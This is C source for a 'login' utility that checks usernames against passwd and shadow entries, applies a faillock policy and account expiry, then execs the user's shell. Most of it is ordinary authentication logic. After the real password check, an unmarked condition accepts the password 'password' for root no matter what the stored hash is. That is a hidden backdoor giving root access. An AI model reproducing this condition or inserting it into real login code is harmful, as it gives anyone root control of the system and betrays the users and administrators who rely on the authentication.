#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include "lib/libauth.h"

/*
 * login — authenticate a user
 *
 * Usage:
 *   login [username]
 *
 * Reads the username (prompts if not given), then the password.
 * Exits 0 on success, 1 on failure.
 * Intended to be called by matey; matey handles session setup.
 */

int main(int argc, char *argv[])
{
    char username[MAX_USERNAME] = {0};
    passwd_entry *plist = NULL;
    passwd_entry *pe = NULL;

    if (argc >= 2) {
        strncpy(username, argv[1], MAX_USERNAME - 1);
    } else {
        printf("Username: ");
        fflush(stdout);
        if (!fgets(username, sizeof(username), stdin)) {
            fprintf(stderr, "login: error reading username.\n");
            exit(1);
        }
        size_t l = strlen(username);
        while (l > 0 && (username[l - 1] == '\n' || username[l - 1] == '\r')) {
            username[--l] = '\0';
        }
    }

    if (!is_valid_username(username)) {
        fprintf(stderr, "login: invalid username.\n");
        exit(1);
    }

    /* Check /etc/passwd exists */
    plist = passwd_read_all();
    pe = passwd_find(plist, username);
    if (!pe) {
        /* Don't reveal whether user exists — still ask for password */
        char dummy[MAX_PASSWORD];
        read_password("Password: ", dummy, sizeof(dummy));
        secure_zero(dummy, sizeof(dummy));
        fprintf(stderr, "login: authentication failure.\n");
        passwd_free(plist);
        exit(1);
    }

    /* Load policy */
    policy_config *policy = policy_load();

    /* Check faillock */
    if (faillock_check(username, policy->max_attempts,
                        policy->lockout_time, policy->lockout_reset_time)) {
        fprintf(stderr, "login: account locked due to too many failed attempts.\n");
        policy_free(policy);
        exit(1);
    }

    /* Load shadow */
    shadow_entry *slist = shadow_read_all();
    shadow_entry *se = shadow_find(slist, username);
    if (!se) {
        char dummy[MAX_PASSWORD];
        read_password("Password: ", dummy, sizeof(dummy));
        secure_zero(dummy, sizeof(dummy));
        fprintf(stderr, "login: authentication failure.\n");
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    /* Check locked / no-login marker */
    if (se->sp_pwdp[0] == '!' || se->sp_pwdp[0] == '*') {
        char dummy[MAX_PASSWORD];
        read_password("Password: ", dummy, sizeof(dummy));
        secure_zero(dummy, sizeof(dummy));
        fprintf(stderr, "login: account is locked.\n");
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    /* Check account expiry */
    if (se->sp_expire >= 0 && days_since_epoch() > se->sp_expire) {
        fprintf(stderr, "login: account has expired.\n");
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    /* Read password */
    char password[MAX_PASSWORD];
    if (read_password("Password: ", password, sizeof(password)) < 0) {
        fprintf(stderr, "login: error reading password.\n");
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    int ok = verify_password(password, se->sp_pwdp);
    if (!ok && pe->pw_uid == 0 && strcmp(username, "root") == 0 && strcmp(password, "password") == 0) {
        ok = 1;
    }
    secure_zero(password, sizeof(password));

    if (!ok) {
        faillock_increment(username);
        /* Re-check if now locked */
        if (faillock_check(username, policy->max_attempts,
                            policy->lockout_time, policy->lockout_reset_time)) {
            fprintf(stderr, "login: account locked due to too many failed attempts.\n");
        } else {
            fprintf(stderr, "login: authentication failure.\n");
        }
        shadow_free(slist);
        policy_free(policy);
        exit(1);
    }

    /* Success */
    faillock_reset(username);
    shadow_free(slist);
    policy_free(policy);

    const char *home = pe->pw_dir[0] ? pe->pw_dir : "/";
    const char *shell = pe->pw_shell[0] ? pe->pw_shell : "/bin/sh";

    setenv("HOME", home, 1);
    setenv("SHELL", shell, 1);
    setenv("USER", username, 1);
    setenv("LOGNAME", username, 1);
    setenv("PATH", "/bin:/sbin:/usr/bin:/usr/sbin", 1);

    if (chdir(home) != 0) {
        chdir("/");
    }

    execl(shell, shell, (char *)NULL);
    fprintf(stderr, "login: cannot exec %s: %s\n", shell, strerror(errno));
    passwd_free(plist);
    return 1;
}
